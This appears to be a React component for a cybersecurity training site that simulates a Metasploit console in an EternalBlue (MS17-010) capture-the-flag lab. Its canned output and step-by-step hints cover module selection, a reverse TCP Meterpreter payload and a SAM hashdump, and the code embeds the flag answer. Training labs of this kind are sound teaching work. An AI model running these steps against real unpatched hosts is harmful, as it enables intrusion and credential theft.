'use client';

import React, { useState, useRef, useEffect } from 'react';
import LabWorkspace from '@/components/LabWorkspace';

export default function MetasploitLab() {
  const [history, setHistory] = useState<{ cmd: string, output: React.ReactNode }[]>([
    { 
      cmd: '', 
      output: (
        <div className="text-cyan font-mono mb-4">
          <pre>{`
       =[ metasploit v6.3.34-dev                          ]
+ -- --=[ 2351 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]
`}</pre>
        </div>
      )
    }
  ]);
  const [input, setInput] = useState('');
  const [isSolved, setIsSolved] = useState(false);
  
  // MSF State
  const [session, setSession] = useState<'msf' | 'meterpreter'>('msf');
  const [module, setModule] = useState<string | null>(null);
  const [rhosts, setRhosts] = useState<string | null>(null);
  const [isExploiting, setIsExploiting] = useState(false);

  const endOfTerminalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    endOfTerminalRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  const simulateExploit = () => {
    setIsExploiting(true);
    setHistory(prev => [...prev, { cmd: `exploit`, output: '' }]);

    let step = 0;
    const interval = setInterval(() => {
      step++;
      
      if (step === 1) {
        setHistory(prev => {
          const newHist = [...prev];
          newHist[newHist.length - 1].output = (
            <div className="text-gray-300">
              <span className="text-blue-500">[*]</span> Started reverse TCP handler on 10.10.10.2:4444<br/>
              <span className="text-blue-500">[*]</span> {rhosts}:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check...
            </div>
          );
          return newHist;
        });
      } else if (step === 2) {
        setHistory(prev => {
          const newHist = [...prev];
          newHist[newHist.length - 1].output = (
            <div className="text-gray-300">
              {newHist[newHist.length - 1].output}
              <br/><span className="text-green-500">[+]</span> {rhosts}:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
              <br/><span className="text-blue-500">[*]</span> {rhosts}:445 - Connecting to target for exploitation.
            </div>
          );
          return newHist;
        });
      } else if (step === 3) {
        setHistory(prev => {
          const newHist = [...prev];
          newHist[newHist.length - 1].output = (
            <div className="text-gray-300">
              {newHist[newHist.length - 1].output}
              <br/><span className="text-blue-500">[*]</span> {rhosts}:445 - Connection established for exploitation.
              <br/><span className="text-blue-500">[*]</span> {rhosts}:445 - Core raw buffer dump (42 bytes)
              <br/><span className="text-blue-500">[*]</span> {rhosts}:445 - Sending all but last fragment of exploit packet
            </div>
          );
          return newHist;
        });
      } else if (step === 4) {
        setHistory(prev => {
          const newHist = [...prev];
          newHist[newHist.length - 1].output = (
            <div className="text-gray-300">
              {newHist[newHist.length - 1].output}
              <br/><span className="text-blue-500">[*]</span> Sending stage (200774 bytes) to {rhosts}
              <br/><span className="text-green-500">[*]</span> Meterpreter session 1 opened (10.10.10.2:4444 -{'>'} {rhosts}:49158) at 2026-10-03 14:30:00
            </div>
          );
          return newHist;
        });
        clearInterval(interval);
        setIsExploiting(false);
        setSession('meterpreter');
      }
    }, 1200);
  };

  const handleCommand = (e: React.FormEvent) => {
    e.preventDefault();
    if (isExploiting) return;

    const cmd = input.trim().replace(/\s+/g, ' ');
    if (!cmd) return;

    let output: React.ReactNode = '';

    if (session === 'msf') {
      if (cmd === 'clear') {
        setHistory([]);
        setInput('');
        return;
      } else if (cmd === 'help') {
        output = `Core Commands\n=============\n\n    Command       Description\n    -------       -----------\n    clear         Clear the terminal\n    help          Help menu\n    search        Search module names and descriptions\n    use           Interact with a module by name or index\n    show options  Displays module options\n    set           Sets a context-specific variable\n    exploit       Launch an exploit attempt`;
      } else if (cmd.startsWith('search ')) {
        const query = cmd.split(' ')[1];
        if (query === 'eternalblue' || query === 'ms17-010') {
          output = `Matching Modules\n================\n\n   #  Name                                           Disclosure Date  Rank     Check  Description\n   -  ----                                           ---------------  ----     -----  -----------\n   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   1  auxiliary/scanner/smb/smb_ms17_010             2017-03-14       normal   Yes    MS17-010 SMB RCE Detection`;
        } else {
          output = `No modules matched your search. Try 'search eternalblue'.`;
        }
      } else if (cmd.startsWith('use ')) {
        const mod = cmd.split(' ')[1];
        if (mod === 'exploit/windows/smb/ms17_010_eternalblue' || mod === '0') {
          setModule('exploit/windows/smb/ms17_010_eternalblue');
          output = `[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp`;
        } else {
          output = `Failed to load module: ${mod}`;
        }
      } else if (cmd === 'show options' || cmd === 'options') {
        if (!module) {
          output = `You must 'use' a module first.`;
        } else {
          output = `Module options (${module}):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOSTS   ${rhosts || '                 '}  yes       The target host(s), see https://docs.metasploit.com/\n   RPORT    445              yes       The target port (TCP)\n   SMBDomain.                no        (Optional) The Windows domain to use for authentication\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   LHOST     10.10.10.2       yes       The listen address\n   LPORT     4444             yes       The listen port`;
        }
      } else if (cmd.startsWith('set ')) {
        const parts = cmd.split(' ');
        if (parts.length >= 3 && parts[1].toUpperCase() === 'RHOSTS') {
          setRhosts(parts[2]);
          output = `RHOSTS => ${parts[2]}`;
        } else {
          output = `Variable => Value`;
        }
      } else if (cmd === 'exploit' || cmd === 'run') {
        if (!module) {
          output = `You must 'use' an exploit module first.`;
        } else if (!rhosts) {
          output = `[-] Exploit failed: The following options failed to validate: RHOSTS.`;
        } else if (rhosts !== '10.10.10.155') {
          output = `[-] Exploit failed: Connection timed out to ${rhosts}. (Hint: Are you targeting the correct IP?)`;
        } else {
          simulateExploit();
          setInput('');
          return;
        }
      } else {
        output = `[-] Unknown command: ${cmd.split(' ')[0]}.`;
      }
    } 
    // Meterpreter State
    else if (session === 'meterpreter') {
      if (cmd === 'help') {
        output = `Core Commands\n=============\n    help      Help menu\n    background Backgrounds the current session\n    sysinfo   Gets information about the remote system\n    getuid    Get the user that the server is running as\n    hashdump  Dumps the contents of the SAM database\n    shell     Drop into a system command shell`;
      } else if (cmd === 'sysinfo') {
        output = `Computer        : WIN-7-TARGET\nOS              : Windows 7 (6.1 Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows`;
      } else if (cmd === 'getuid') {
        output = `Server username: NT AUTHORITY\\SYSTEM`;
      } else if (cmd === 'hashdump') {
        output = (
          <div className="text-emerald-400 p-2 border border-emerald-500/30 bg-emerald-900/20 rounded mt-2">
            Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
            FlagUser:1000:aad3b435b51404eeaad3b435b51404ee:ZENTRION{'{'}3t3rn4lblu3_pwn3d{'}'}:::<br/><br/>
            [SUCCESS] SAM database dumped. Flag retrieved!
          </div>
        );
        setIsSolved(true);
      } else if (cmd === 'background') {
        setSession('msf');
        output = `[*] Backgrounding session 1...`;
      } else if (cmd === 'shell') {
        output = `Process 1337 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32> (Simulation restricted: Please use meterpreter commands instead of native shell)`;
      } else {
        output = `[-] Unknown command: ${cmd.split(' ')[0]}. Type 'help' for available commands.`;
      }
    }

    setHistory([...history, { cmd, output }]);
    setInput('');
  };

  const getPrompt = () => {
    if (session === 'meterpreter') {
      return <span className="text-red-500 mr-2 font-bold underline">meterpreter {'>'}</span>;
    } else {
      let promptText = 'msf6';
      if (module) {
        const modName = module.split('/').pop();
        promptText = `msf6 exploit(<span class="text-red-500">${modName}</span>)`;
      }
      return (
        <span className="text-blue-500 mr-2 font-bold">
          <span dangerouslySetInnerHTML={{ __html: promptText }} /> {'>'}
        </span>
      );
    }
  };

  const missionBriefing = (
    <>
      <p className="mb-3">
        The <strong>Metasploit Framework</strong> is the world's most widely used penetration testing software. It provides a massive library of exploits and payloads.
      </p>
      <p className="mb-3">
        Your Nmap scan found a legacy Windows 7 machine at <code>10.10.10.155</code> running a vulnerable SMB service (port 445). It is likely vulnerable to the infamous <strong>MS17-010 EternalBlue</strong> exploit, which allows remote code execution as <code>SYSTEM</code>.
      </p>
      <div className="p-3 bg-void rounded border border-line mt-4">
        <span className="text-xs font-mono text-blue-500 block mb-1">Target:</span>
        <span className="text-sm text-white">Use Metasploit to exploit the EternalBlue vulnerability, gain a meterpreter shell, and dump the SAM password hashes (using <code>hashdump</code>) to retrieve the flag.</span>
      </div>
    </>
  );

  const hints = [
    "1. Type 'search eternalblue' to find the module.",
    "2. Type 'use 0' or 'use exploit/windows/smb/ms17_010_eternalblue' to select it.",
    "3. Set the target IP by typing: set RHOSTS 10.10.10.155",
    "4. Type 'exploit' to launch the attack.",
    "5. Once you have a 'meterpreter >' prompt, type 'hashdump' to dump the passwords and capture the flag."
  ];

  return (
    <LabWorkspace
      labId="metasploit-eternalblue"
      title="Exploitation (Metasploit)"
      category="Red Teaming"
      difficulty="Advanced"
      missionBriefing={missionBriefing}
      hints={hints}
      isSolved={isSolved}
      flagId="ZENTRION{3t3rn4lblu3_pwn3d}"
    >
      <div className="flex flex-col h-full bg-[#0a0a0f]">
        
        {/* Top Navbar Simulation */}
        <div className="px-6 py-4 border-b border-line bg-surface/30 flex items-center justify-between">
          <h3 className="text-white font-bold text-lg flex items-center gap-2">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="text-blue-500"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
            Metasploit Framework (msfconsole)
          </h3>
          <span className="px-3 py-1 bg-blue-500/20 border border-blue-500/30 text-blue-300 text-xs font-mono rounded">
            v6.3.34-dev Simulation
          </span>
        </div>

        {/* Workspace Layout */}
        <div className="flex-1 p-6 flex flex-col h-full">
          
          <div className="w-full flex-1 flex flex-col border border-line bg-void rounded-xl overflow-hidden font-mono shadow-[0_0_30px_rgba(59,130,246,0.05)]">
            
            {/* Terminal Header */}
            <div className="flex items-center gap-2 p-3 bg-surface border-b border-line">
              <div className="w-3 h-3 rounded-full bg-red-500"></div>
              <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
              <div className="w-3 h-3 rounded-full bg-green-500"></div>
              <span className="text-xs text-mute ml-2">msfconsole</span>
            </div>

            {/* Terminal Body */}
            <div 
              className="flex-1 p-4 overflow-y-auto text-sm text-gray-300 whitespace-pre-wrap"
              onClick={() => document.getElementById('terminal-input')?.focus()}
            >
              {history.map((h, i) => (
                <div key={i} className="mb-4">
                  {h.cmd !== '' && (
                    <div className="flex text-white">
                      {i < history.length && h.cmd.includes('exploit') && h.output === '' ? getPrompt() : 
                        h.cmd === 'background' ? <span className="text-red-500 mr-2 font-bold underline">meterpreter {'>'}</span> :
                        h.cmd.includes('hashdump') ? <span className="text-red-500 mr-2 font-bold underline">meterpreter {'>'}</span> :
                        h.cmd.includes('sysinfo') ? <span className="text-red-500 mr-2 font-bold underline">meterpreter {'>'}</span> :
                        <span className="text-blue-500 mr-2 font-bold">msf6 {'>'}</span>} {/* Simplified historic prompt */}
                      {h.cmd}
                    </div>
                  )}
                  {h.output && (
                    <div className="mt-1 text-gray-400 leading-relaxed">
                      {h.output}
                    </div>
                  )}
                </div>
              ))}

              {/* Input Line */}
              <form onSubmit={handleCommand} className="flex text-white mt-2">
                {getPrompt()}
                <input
                  id="terminal-input"
                  type="text"
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                  disabled={isExploiting}
                  className="flex-1 bg-transparent border-none outline-none text-white focus:ring-0 p-0 disabled:opacity-50"
                  autoFocus
                  autoComplete="off"
                  spellCheck="false"
                />
              </form>
              
              <div ref={endOfTerminalRef} />
            </div>
          </div>
        </div>
      </div>
    </LabWorkspace>
  );
}
